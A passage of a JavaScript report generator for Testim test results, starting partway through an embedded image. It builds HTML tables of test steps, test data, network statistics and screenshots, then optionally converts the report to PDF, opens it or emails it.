jM7xxMMbW5hjakVffOnb61wvYVplyqUydUEyZYZnWY+xmngeFOTnzYWj+2nS2yFaS1Z3Iu1ybdOVzRULPnidd/5CXu+FwT5JMcwJd11EGfjnvvf3BZ7J+Dro/iC8QZnPMpCObIZU0yc9a5B9bJOMmremUgAVW/JGs+uLaS5iBR/SIN7uyW0TiKIYMFAwGBEDMflR87H348Zd83T+Moxhoug/dF8QfitCSaaZvTzvhSJirt2eZnrNJJZKYUROv4lCvF9nbYtGzI0oiHsPvr8MwpIemcevuAtGIH8V1XW9i4jbHT/zEiYERbj1YrpldRdeNIKHNUfZ0tfHivqy8EYXBy/eIyEoe3Rfj+eciIsUWAoFgTQ5D7szMlhi8NE7h4UPefKVn5R0ICLOzs4yMXuHb/jMMDN2i+ERZYaMKkDDaEo9zuG872YROb0cjne3NhEL1UqNLc40lkXj48h2uXh+nLRnkUF83pmn+9yXbsgqFQoHfBoc53j/E0LVpLIS2UFYVnWxLnC8+Osreriyqpte2TJTiyo0850bGiG7yeGn/DjKZjMgl8shrW/NXUf1aKpXI5XKcPHWWb34e5fr9Eopex8GuZr769B2akwmpg/HJIoPnx3DLcxza10Y22ybmBlHVf/+b1gA8japsi4uL/HntOt+JbD+euUE8keCHz99HE49+v3iTmUKe3s4mdnd3EA6Ha+Y+G+sCPI2KPM9iscjQuUt8PzBMLBoh1hCqGX+gt5vGxsaawevFhgBPw7IspqamJO+ydWsLTU1N+GTfqzqvH/A3qiQQaRECd/IAAAAASUVORK5CYII=" alt="" />'
                + "</a>"
        }
        testInfo += "</td>\n";
        testInfo += "    <tr>\n";
    }

    if (includeTestResults === true && reportData?.TestStatus !== "PASSED" && typeof reportData?.testResultData._stepInternalData.failureReason !== 'undefined') {
        testInfo += "    <tr>\n";
        testInfo += "      <td class='test-info-label'>&nbsp;</td>"
        testInfo += "      <td ><b>Failure Reason</b></td>"
            + "<td style='word-wrap:break-word'>"
            //+ "<span style='color:red;'>" + testResultData?._stepInternalData.failureReason + "</span>";
            + reportData?.testResultData._stepInternalData.failureReason;
        +"</td>\n";
        testInfo += "    <tr>\n";
    }

    testInfo += "  </table>\n";

    if (includeLogo) {
        if (includeTestResults)
            testInfo = "<img class='logo' alt='Testim Logo' src='" + reportLogoDataUrl + "'>" + testInfo;
        else
            testInfo = "<img class='logo' alt='Testim Logo' style='width:50px; height: 50px' src='" + reportLogoDataUrl + "'>" + testInfo;
    }

    return testInfo;
}
function htmlReportTestDataSectionCreate(testData) {

    let html = "<table class='styled-table test-data-table'>\n";

    // html += "  <caption>Test Data</caption>\n";

    html += "   <thead>\n";

    html += "     <tr>";
    html += "       <th style='width:75px'>";
    html += "           <b>Test Data</b>";
    html += "       </th>";

    html += "       <th>";
    html += "           <b>Test Data Value</b>";
    html += "       </th>";

    html += "     </tr>";

    html += "    </thead>\n";

    let test_data = [];
    let keys = Object.keys(testData);
    keys.forEach(function (key) {
        html += "    <tr>\n";
        html += "      <td style='text-align: left;'>";
        html += "           <b>" + key + "</b>";
        html += "      </td>";
        html += "      <td style='text-align: left;'>";
        html += (hiddenParams.includes(key)) ? "***********" : testData[key];
        html += "      </td>";
        html += "    </tr";
    });

    html += "  </table>\n";

    return html;

}
function htmlReportNetworkRequestStatsSectionCreate(networkRequestStats) {

    //console.log("  htmlReportNetworkRequestStatsSectionCreate");
    let html = "<table class='styled-table network-request-table'>\n";

    // html += "  <caption>Network Request Statistics</caption>\n";

    html += "   <thead>\n";

    html += "     <tr>";

    html += "       <th><b>URL</b></th>";
    html += "       <th><b>Count</b></th>";

    html += "       <th><b>Duration Min&nbsp;(ms)</b></th>";
    html += "       <th><b>Duration Max&nbsp;(ms)</b></th>";
    html += "       <th><b>Duration Ave&nbsp;(ms)</b></th>";
    html += "       <th><b>Duration Tot&nbsp;(ms)</b></th>";

    html += "       <th><b>Response Size&nbsp;Min</b></th>";
    html += "       <th><b>Response Size&nbsp;Max</b></th>";
    html += "       <th><b>Response Size&nbsp;Ave</b></th>";
    html += "       <th><b>Response Size&nbsp;Tot</b></th>";

    html += "     </tr>";

    html += "    </thead>\n";

    networkRequestStats.forEach((_networkRequestStats) => {
        html += "    <tr>\n";
        if (enableHyperlinks)
            html += "  <td style='text-align: left;'><b><a target='blank' href='" + _networkRequestStats?.url + "'>" + _networkRequestStats?.url + "</a></b></td>";
        else
            html += "  <td style='text-align: left;'><b>" + _networkRequestStats?.url + "</b></td>";
        html += "      <td style='text-align: center;'><b>" + _networkRequestStats?.count + "</b></td>";
        html += "      <td style='text-align: center;'><b>" + _networkRequestStats?.minDuration + "</b></td>";
        html += "      <td style='text-align: center;'><b>" + _networkRequestStats?.maxDuration + "</b></td>";
        html += "      <td style='text-align: center;'><b>" + _networkRequestStats?.aveDuration + "</b></td>";
        html += "      <td style='text-align: center;'><b>" + _networkRequestStats?.totDuration + "</b></td>";
        html += "      <td style='text-align: center;'><b>" + _networkRequestStats?.minResponseSize + "</b></td>";
        html += "      <td style='text-align: center;'><b>" + _networkRequestStats?.maxResponseSize + "</b></td>";
        html += "      <td style='text-align: center;'><b>" + _networkRequestStats?.aveResponseSize + "</b></td>";
        html += "      <td style='text-align: center;'><b>" + _networkRequestStats?.totResponseSize + "</b></td>";
        html += "    </tr";
    });

    html += "  </table>\n";

    return html;

}
function htmlReportStepDetailsCreate(stepEntries, project_id, test_id, result_id, testResultData, zippedScreenshotsFilename) {

    if (verbose)
        console.log("testResultData.Steps", testResultData.Steps);

    let extended_step_data = !(testResultData.Steps.hasOwnProperty("NoStepData"));

    let html = "";
    let elapsedTime = 0;

    // Add modal popup for displaying screenshot larger
    if (includeScreenShots) {
        html += modalStyle + modalScript + modalMarkup;
    }

    html += "<table class='styled-table step-table'>";

    html += "   <thead>\n";

    html += "     <tr>";

    html += reportColumns.includes("StepNumber") ? "<th class='step-number'><b>Step#</b></th>" : "";

    html += reportColumns.includes("StepName") ? "<th class='step-name'><b>Step</b></th>" : "";

    html += reportColumns.includes("StepType") ? "<th class='step-type'><b>Step Type</b></th>" : "";

    html += reportColumns.includes("StepTime") ? "<th class='step-time'><b>Time</b></th>" : "";

    html += reportColumns.includes("ElapsedTime") ? "<th class='step-elapsed-time'><b>Elapsed Time&nbsp;(s)</b></th>" : "";

    html += reportColumns.includes("Duration") ? "<th class='step-duration'><b>Duration&nbsp;(s)</b></th>" : "";

    html += reportColumns.includes("Status") ? "<th class='step-status'><b>Status</b></th>\n" : "";

    html += reportColumns.includes("PageURL") ? "<th class='step-pageurl'><b>Page URL</b></th>\n" : "";

    if (includeScreenShots) {
        html += reportColumns.includes("ScreenShot") ? "<th class='step-screenshot'><b>ScreenShot</b></th>\n" : "";
    }

    html += "     </tr>";

    html += "    </thead>\n";

    html += "    <tbody>\n";

    if (!extended_step_data) {
        html += "<tr style='border: 1 px solid red; width: 100%; text-align: center;'>"
            + "<td colspan=9>" + testResultData.Steps.NoStepData.replace("_steps is", "Detailed step results are not available.  Steps results are") + "</td>"
            + "</tr>";
        //html += "  </table>\n";
        //return html;
    }

    if (verbose) {
        console.log("------------------------------------------------------------------------");
        console.log("  NUMBER OF RAW STEPS: (" + stepEntries.length + ")");
    }
    let step_entries = stepEntries.filter((step) => {
        let step_parts = step.name.split('-');
        let step_name = step_parts.slice(4, step_parts.length - 1).join("-");
        return (!step_name.toLowerCase().replace(' ', '').includes('beforetest')
            && !step_name.toLowerCase().replace(' ', '').includes('beforestep')
            && !step_name.toLowerCase().replace(' ', '').includes('afterstep')
            && !step_name.toLowerCase().replace(' ', '').includes('aftertest'));
    })

    if (verbose) {
        console.log("  NUMBER OF STEPS: (" + step_entries.length + ")");
        console.log("      STEPS: (" + JSON.stringify(step_entries, null, 2));
    }

    let group_path = [];
    let group_level = 0;
    let group_level_last = -1;
    let currentGroup = "";
    let step_number = -1;
    step_entries.forEach(function (stepEntry) {

        let _html = "";
        {
            step_number = step_number + 1;

            let stepPage = (step_number <= 1) ? testResultData.BaseURL : testResultData.Steps[step_number - 1]?.page;
            let stepStartTime = testResultData?.Steps[step_number - 1]?.endTime;
            let stepNumber = testResultData?.Steps[step_number]?.stepNumber;
            let stepName = testResultData?.Steps[step_number]?.name.substring(0, MAX_STEP_NAME_DISPLAY - 1);
            let stepId = testResultData?.Steps[step_number]?.stepId;
            let stepPath = testResultData?.Steps[step_number]?.path;
            let stepEndTime = testResultData?.Steps[step_number]?.endTime;
            let stepType = testResultData?.Steps[step_number]?.type;
            let stepStatus = testResultData?.Steps[step_number]?.status;
            let stepDuration = !isNaN(stepStartTime) ? Number(stepEndTime - stepStartTime) / 1000 : null;
            let stepTime = !isNaN(stepStartTime) ? new Date(stepStartTime).toLocaleTimeString() : "";
            elapsedTime += !isNaN(stepDuration) ? stepDuration : 0;

            if (verbose)
                console.log("  JSON STEP (" + stepNumber + ") NAME: ", stepName, "ID", stepId, "PATH", stepPath);

            _html += "    <tr>\n";

            if (reportColumns.includes("StepNumber")) {
                _html += "      <td class='step-number' style='text-align: center;'>";
                _html += "           <b>" + (step_number + 1) + "</b>";
                _html += "      </td>";
            }

            if (reportColumns.includes("StepName")) {

                let step_link = "https://app.testim.io/#/project/" + project_id + "/branch/" + branch + "/test/" + test_id
                    + "/step/" + stepId
                    //+ "/viewer/screenshots"
                    + "?result-id=" + result_id
                    + "&path=" + stepPath
                    + "&selected-steps=" + stepId
                    ;

                _html += "      <td class='step-name'>";

                _html += "<p>"

                if (enableGroups === true) {

                    verbose = true;

                    if (!group_path.includes(stepPath))
                        group_path.push(stepPath);
                    if (group_path.length > 0 && group_path[group_path.length - 1] !== stepPath)
                        group_path.pop();
                    if (stepPath === undefined)
                        group_path = [];

                    group_level = group_path.length;

                    //console.log("   group_path", group_path.length, group_path.join(" => "), "    " + stepPath, "    " + stepName);

                    switch (stepType) {
                        case "action-code-step":
                        case "cli-action-code-step":
                        case "network-validation-step":
                            group_path.pop();
                            group_level = ((stepPath !== undefined) && stepPath.includes(":")) ? (stepPath.match(/:/g) ?? []).length : 0;
                            break;
                        default:
                            break;
                    }

                    currentGroup = (group_path !== undefined) ? group_path[group_path.length - 1] : "Root";

                    // Add folder icon
                    if (group_level > group_level_last && group_level > 0) {

                        let shared_group_link = "https://app.testim.io/#/project/" + project_id + "/branch/" + branch + "/test/" + test_id
                            + "/step/" + stepPath
                            + "?result-id=" + result_id
                            + "&path=" + stepPath;

                        _html += "&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;".repeat(Math.max(group_level, 0))
                            + (enableHyperlinks ? "<a target='_blank' href='" + shared_group_link + "'>" : "")
                            + "<img src='" + folderImageDataUrl + " alt='" + stepPath + "'/>"
                            + (enableHyperlinks ? "</a>" : "")

                    }
                    // No folder icon, only arrow
                    else if (group_level > 0) {

                        _html += "&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;".repeat(Math.max(group_level, 0));
                        if (group_level > 0)
                            _html += "&#8627;&nbsp;";

                    }

                    if (verbose)
                        console.log(stepType, "stepPath", group_level, group_level_last, stepPath, currentGroup);

                    group_level_last = group_level;
                }

                _html += (enableHyperlinks ? "<a target='_blank' href='" + step_link + "'>" : "")
                    + "<b>" + ((typeof stepName !== 'undefined' && stepName !== null) ? stepName : stepId) + "</b>"
                    + (enableHyperlinks ? "</a>" : "")
                    + "</p>";
                _html += "      </td>";
            }

            /* Change the internal Testim step type names to something prettier
             */
            let step_type = (typeof stepTypeDisplayName !== 'undefined' && Object.keys(stepTypeDisplayName).includes(stepType)) ? stepTypeDisplayName[stepType] : stepType;

            if (reportColumns.includes("StepType")) {
                _html += "      <td class='step-type'>";
                _html += "           <b>" + step_type + "</b>";
                _html += "      </td>";
            }

            if (reportColumns.includes("StepTime")) {
                _html += "      <td class='step-time' nowrap='nowrap'>";
                _html += "         <b>" + stepTime + "</b>";
                _html += "      </td>";
            }

            if (reportColumns.includes("ElapsedTime")) {
                _html += "      <td class='step-elapsed-time'>";
                _html += "         <b>" + ((elapsedTime > 0) ? elapsedTime.toFixed(3) : "") + "</b>";
                _html += "      </td>";
            }

            if (reportColumns.includes("Duration")) {
                _html += "      <td class='step-duration'>";
                _html += "         <b>" + ((stepDuration !== null) ? stepDuration : "") + "</b>";
                _html += "      </td>";
            }

            if (reportColumns.includes("Status")) {
                _html += "<td class='step-status'>";
                _html += (stepStatus === "PASSED" ? "<b style='color:green;'>PASSED</b>" : "<b style='color:red;'>FAILED</b>");
                _html += "</td>\n";
            }

            if (reportColumns.includes("PageURL")) {
                _html += "      <td class='step-pageurl'>";

                _html += (enableHyperlinks ? "<a target='blank' href='" + stepPage + "'>" : "")
                    + stepPage
                    + (enableHyperlinks ? "</a>" : "");

                _html += "      </td>\n";
            }

            if (includeScreenShots && reportColumns.includes("ScreenShot")) {
                let image_src = "./" + zippedScreenshotsFilename.replace('.zip', '').replace('.html', '') + "/" + stepEntry.zipEntryName;
                if (embedImages) {
                    let mime = 'image/png';
                    let encoding = 'base64';
                    let data = stepEntry.screenshotDataUrl;
                    if (verbose)
                        console.log("STEP IMAGE: ", step_number, "stepEntry.zipEntryName: ", stepEntry.zipEntryName);
                    image_src = 'data:' + mime + ';' + encoding + ',' + data;
                }

                _html += "      <td class='step-screenshot'>";
                if (stepEntry.zipEntryName !== undefined)
                    _html += "          <img alt='" + stepName + "' class='screenshot' onclick='show(this)' src='" + image_src + "' onclick='show()'/>";
                _html += "      </td>\n";
            }

            _html += "    </tr>\n";

        }

        html += _html;

    });

    if (verbose)
        console.log("STEP COUNTS: zipEntries(filtered): ", step_number, "testResultData?.Steps", testResultData?.Steps.length);

    html += "    </tbody>\n";

    html += "  </table>\n";

    if (verbose)
        console.log("------------------------------------------------------------------------");

    return html;

}
function htmlReportGenerate(reportData, reportFilename) {

    return new Promise((resolve, reject) => {

        return new Promise((resolve, reject) => {

            console.log("THEN generate html report");

            let html = "<html>\n";

            html += " <head>\n";

            html += " <style> " + reportStyleMarkup + "</style>";

            html += " </head>\n";

            html += " <body>\n";

            html += " <div class='outer-div'>\n";

            let testInfo = htmlReportTestInfoHeaderCreate(reportData);
            html += testInfo;

            console.log("includeTestData", includeTestData);
            if (includeTestData && reportData.testData !== undefined && reportData.testData !== null)
                html += htmlReportTestDataSectionCreate(reportData.testData);

            console.log("includeNetworkRequestStats", includeNetworkRequestStats);
            if (includeNetworkRequestStats && reportData.networkRequestStats !== undefined && reportData.networkRequestStats !== null)
                html += htmlReportNetworkRequestStatsSectionCreate(reportData.networkRequestStats);

            console.log("includeStepDetails", includeStepDetails);
            if (includeStepDetails) {
                html += htmlReportStepDetailsCreate(reportData.stepEntries, reportData.projectId, reportData.testId, reportData.resultId, reportData.testResultData, reportFilename, reportFileDirectory, reportData.zippedScreenshotsFilename);
            }

            html += "  </div>\n";

            html += " </body>\n";
            html += "</html>";

            resolve(html);

        })
            .then((html) => /* THEN write generated html to file */ {

                let html_file = reportFileDirectory + reportData.zippedScreenshotsFilename.replace('.zip', '.html');

                console.log("THEN write generated html to file", html_file);

                fs.writeFile(html_file, html, function (err) {
                    if (err) return console.log(err);
                });

                resolve({ "reportFilename": reportFilename, "reportContent": html, });

            })
            .catch((e) => {
                console.error(e);
            });

    });

}

/*
 * Retrieve report data from somewhere and generate/open/email report.
 */

function configureReportGenerator() {

    /* Cleanup option data
     */
    if (reportFileDirectory.includes("\\") && !reportFileDirectory.endsWith("\\"))
        reportFileDirectory += "\\";

    if (reportFileDirectory.includes("/") && !reportFileDirectory.endsWith("/"))
        reportFileDirectory += "/";

    if (includeTestResults === false) {
        reportColumns = ["StepNumber", "StepName", "StepType", "PageURL", "ScreenShot"];
        pdfOptions = { format: 'A4', scale: 0.9 };
        includeTestData = false;
        includeNetworkRequestStats = false;
    }

    if (typeof resultIdsQuery === 'object' && typeof resultIdsQuery[0] === 'string') {
        resultIds = [...resultIdsQuery];
        resultIdsQuery = undefined;
    }

    /* Validate required parameters
    */

    if (reportDataSource === "JSONDBFS") {
        if (typeof jsondbfsPath === 'undefined' || jsondbfsPath === null) {
            throw new CancelError("Parameter 'jsondbfsPath' is undefined.  Please set jsondbfsPath parameter and try again");
        }
        if (typeof jsondbfsCollectionName === 'undefined' || jsondbfsCollectionName === null) {
            throw new CancelError("Parameter 'jsondbfsCollectionName' is undefined.  Please set jsondbfsCollectionName parameter and try again");
        }
        if (!fs.existsSync(jsondbfsPath)) {
            throw new CancelError("ERROR: jsondbfsPath " + jsondbfsPath + " does not exist");
        }
    }

    if (reportDataSource === "SQLServer") {
        if (typeof sqlServerUsername === 'undefined' || sqlServerUsername === null) {
            throw new CancelError("Parameter 'sqlServerUsername' is undefined.  Please set sqlServerUsername parameter and try again");
        }
        if (typeof sqlServerPassword === 'undefined' || sqlServerPassword === null) {
            throw new CancelError("Parameter 'sqlServerPassword' is undefined.  Please set sqlServerPassword parameter and try again");
        }
        if (typeof sqlServerInstance === 'undefined' || sqlServerInstance === null) {
            throw new CancelError("Parameter 'sqlServerInstance' is undefined.  Please set sqlServerInstance parameter and try again");
        }
        if (typeof sqlServerDatabase === 'undefined' || sqlServerDatabase === null) {
            throw new CancelError("Parameter 'sqlServerUsername' is undefined.  Please set sqlServerUsername parameter and try again");
        }
    }

    if ((typeof resultIdsQuery === 'undefined' || resultIdsQuery === null) && (typeof resultIds === 'undefined' || resultIds === null || resultIds.length === 0)) {
        throw new CancelError("\nParameter 'resultIdsQuery' and 'resultIds' are undefined.  Please set either resultIdsQuery or resultIds parameter and try again\n");
    }

    if (includeScreenShots
        && (typeof accessToken === 'undefined' || accessToken === null)
        && (typeof accessTokenURL === 'undefined' || accessTokenURL === null)
        && (typeof testimToken === 'undefined' || testimToken === null)) {
        throw new CancelError("When including screenshots, either 'accessTokenURL', 'testimToken' or 'accessToken' must be defined and valid.  Please set 'accessTokenURL', 'testimToken' or 'accessToken' parameters and try again");
    }

    if (emailReport === true) {

        if (typeof reportEmailToAddresses === 'undefined' || reportEmailToAddresses === null) {
            CancelError("Parameter 'reportEmailToAddresses' is undefined.  Need a recipient to send email to");
            emailReport = false;
        }
        if (typeof reportEmailFromAddress === 'undefined' || reportEmailFromAddress === null) {
            CancelError("Parameter 'reportEmailFromAddress' is undefined.  Need a sender address to send email from");
            emailReport = false;
        }

    }

}
async function TestResultIdsGet(resultIdsQuery) {

    return new Promise((resolve) => {

        let result_ids = [];

        let result_datasource = (resultIdsQuery !== undefined && resultIdsQuery !== null) ? reportDataSource : 'whatever';
        switch (result_datasource) {

            case "JSONDBFS":
                console.log("JSONDBFS resultIdsQuery: ", resultIdsQuery)
                JSONDBFS_ResultIDsSearch(jsondbfsCollectionName, resultIdsQuery)
                    .then((resultIds) => {
                        result_ids = [...resultIds];
                        resolve(result_ids);
                    });
                break;

            case "SQLServer":
                console.log("SQLServer resultIdsQuery: ", resultIdsQuery)
                SQLServer_ResultIDsSearch(resultIdsQuery, resolve)
                    .then((resultIds) => {
                        result_ids = [...resultIds];
                        resolve(result_ids);
                    })
                break;

            default:
                console.log("resultIdsQuery unspecified.  Use resultIds: ", resultIds)
                if (typeof resultIds == 'string')
                    result_ids.push(resultIds);
                else
                    result_ids = [...resultIds];

                resolve(result_ids);
                break;
        }

    });

}
async function GenerateReports(ResultIDs) {

    return new Promise((resolve) => {

        if (ResultIDs == undefined || ResultIDs?.length === 0) {
            reject("No ResultIDs specified");
        }

        console.log("generateReports for ResultIDs: " + ResultIDs);

        ResultIDs.forEach((result_id) => {

            result_id = result_id.trim();

            return new Promise((resolve, reject) => {

                console.log("Generate Report for ResultID: " + result_id);

                TestResultsGet(result_id)

                    .then((reportData) => {

                        if (JSON.stringify(reportData) === '{}' || (reportData.testData === undefined || reportData.testData === null)) {
                            throw new Error("\nERROR: Result ID: '" + result_id + "' not found in " + reportDataSource + ".");
                        }

                        reportData.stepEntries = reportData.testResultData.Steps;

                        console.log("TestResultsGet GOT");

                        console.log("-------------------------------------");
                        console.log("  projectId           = " + reportData.projectId);
                        console.log("  testId              = " + reportData.testId);
                        console.log("  resultId            = " + reportData.resultId);
                        console.log("  stepCount           = " + reportData.stepEntries.length);
                        console.log("  resultUrl           = " + reportData.resultUrl);
                        console.log("  testResultData      = " + ((reportData.testResultData !== undefined && reportData.testResultData !== null) ? "DEFINED" : "UNDEFINED"));
                        console.log("  testData            = " + ((reportData.testData !== undefined && reportData.testData !== null) ? "DEFINED" : "UNDEFINED"));
                        console.log("  networkRequestStats = " + ((reportData.networkRequestStats !== undefined && reportData.networkRequestStats !== null) ? "DEFINED" : "UNDEFINED"));
                        console.log("-------------------------------------");

                        reportData.zippedScreenshotsFilename = (reportData.testName !== null) ? reportData.testName + "_" + reportData.resultId + ".zip" : "reportfile" + "_" + reportData.resultId + ".zip";
                        reportData.reportFilename = (reportData.testName !== null) ? reportData.testName + "_" + reportData.resultId + ".html" : "reportfile" + "_" + reportData.resultId + ".html";
                        createDirectoryIfNotExists(reportFileDirectory);

                        if (verbose) {
                            console.log("-------------------------------------");
                            console.log("reportFilename:            ", reportData.reportFilename);
                            console.log("zippedScreenshotsFilename: ", reportData.zippedScreenshotsFilename);
                            console.log("-------------------------------------");
                        }

                        return ({ "reportFilename": reportData.reportFilename, "zippedScreenshotsFilename": reportData.zippedScreenshotsFilename, "reportData": reportData });

                    })
                    .then((data) => {

                        let reportFilename = data.reportFilename;
                        let zippedScreenshotsFilename = data.zippedScreenshotsFilename;
                        let reportData = data.reportData;

                        return new Promise((resolve, reject) => {

                            if (includeScreenShots) {

                                ScreenshotsPrepareRequest(reportData)

                                    .then(() => {

                                        console.log("Now DownloadScreenshots");
                                        let screenshotsUrl = "https://services.testim.io/result/" + result_id + "/screenshots" + "?access_token=" + accessToken + "&projectId=" + reportData.projectId;
                                        return DownloadScreenshots(screenshotsUrl, reportFileDirectory + zippedScreenshotsFilename)

                                    })
                                    .then(() => {

                                        // read archive
                                        let zip = new AdmZip(reportFileDirectory + zippedScreenshotsFilename);

                                        // extract the specified zip file to the specified location
                                        if (!embedImages) {
                                            console.log("THEN extract to ", reportFileDirectory + zippedScreenshotsFilename.replace('.zip', ''));
                                            zip.extractAllTo(reportFileDirectory + zippedScreenshotsFilename.replace('.zip', ''));
                                        }

                                        if (trashDownloadedZipfile) {
                                            console.log("THEN trash ", reportFileDirectory + zippedScreenshotsFilename);
                                            fs.unlinkSync(reportFileDirectory + zippedScreenshotsFilename);
                                        }

                                        let zipEntries = zip.getEntries(); // an array of ZipEntry records  

                                        let step_number = 0;
                                        console.log("  stepCount           = " + reportData.stepEntries.length);

                                        zipEntries.forEach(function (zipEntry) {

                                            let step_id = zipEntry.name.split('-')[zipEntry.name.split('-').length - 1].replace(".jpg", "");

                                            let step_number = reportData.stepEntries.findIndex(x => x.stepId === step_id);
                                            let encoding = 'base64';
                                            if (step_number >= 0) {
                                                reportData.stepEntries[step_number]['zipEntryName'] = zipEntry.name;
                                                reportData.stepEntries[step_number]['screenshotDataUrl'] = zipEntry.getData().toString(encoding);
                                            }

                                        });

                                        resolve({ "reportFilename": reportFilename, "reportData": reportData });

                                    });
                            }
                            else {
                                resolve({ "reportFilename": reportFilename, "reportData": reportData });
                            }

                        });

                    })
                    .then((data) => {

                        let reportFilename = data.reportFilename;

                        console.log("PROCESS AND PREP FOR HTML FILE GENERATION",
                            "\n\treportFilename", reportFilename);

                        return (data);

                    })
                    .then((data) => /* THEN generate html report */ {

                        let reportFilename = data.reportFilename;
                        let reportData = data.reportData;

                        console.log("THEN generate html report: ", reportFilename);

                        htmlReportGenerate(reportData, reportFilename)

                            .then((data) => /* THEN Create PDF file */ {

                                let html_file = reportFileDirectory + reportData.reportFilename;
                                let pdf_filepath = reportFileDirectory + reportData.reportFilename.replace('.html', '.pdf');

                                return new Promise((resolve, reject) => {
                                    if (generatePdf === true) {

                                        console.log("THEN Create PDF", pdf_filepath);

                                        let options = pdfOptions;
                                        let file = { url: 'file://' + html_file };

                                        if (verbose)
                                            console.log("  CREATING PDFfile ", pdf_filepath);

                                        HtmlToPdf.generatePdf(file, options).then(pdfBuffer => {
                                            fs.writeFile(pdf_filepath, pdfBuffer, function (err) {
                                                if (err) {
                                                    console.log(err);
                                                    reject(err);
                                                }
                                                if (verbose)
                                                    console.log("  PDF file ", pdf_filepath, "Created.");

                                                resolve(pdf_filepath);
                                            });
                                        });

                                    }
                                    else {
                                        resolve(html_file);
                                    }
                                });

                            })
                            .then((reportFile) => { /* THEN open generated report file */

                                console.log("openReport", openReport, reportFileDirectory + "/" + reportFile);
                                if (openReport) {
                                    if (verbose)
                                        console.log("OPEN file://" + reportFileDirectory + reportFile);
                                    open("file://" + reportFile);
                                }
                                return (reportFile);
                            })
                            .then((reportFile) => { /* THEN email generated report file */

                                console.log("emailReport", emailReport);
                                if (emailReport) {
                                    if (verbose)
                                        console.log("EMAIL file://" + reportFileDirectory + reportFile);

                                    reportEmailSubject = "Test Results for " + ((reportData !== null ? "Test: [" + reportData.testResultData.TestName : "TestID: [" + reportData.testId)) + "], ResultID: " + reportData.resultId;
                                    reportEmailMessage = htmlReportTestInfoHeaderCreate(reportData, false);

                                    TestimReportEmail(reportEmailToAddresses, reportEmailFromAddress, reportEmailSubject, reportEmailMessage, reportFile);
                                }

                            })
                            .then((reportFile) => {

                                console.log("====================================== Bob's your uncle ===================================");

                                resolve();

                            });

                    })
                    .catch((err) => {

                        console.error(err.message);
                        reject(err.message);

                    });

            })
                .catch(err => {

                    reject(err.message);

                });

        });

    });

}

configureReportGenerator();

TestResultIdsGet(resultIdsQuery)
    .then((resultIds) => {
        GenerateReports(resultIds)
    });
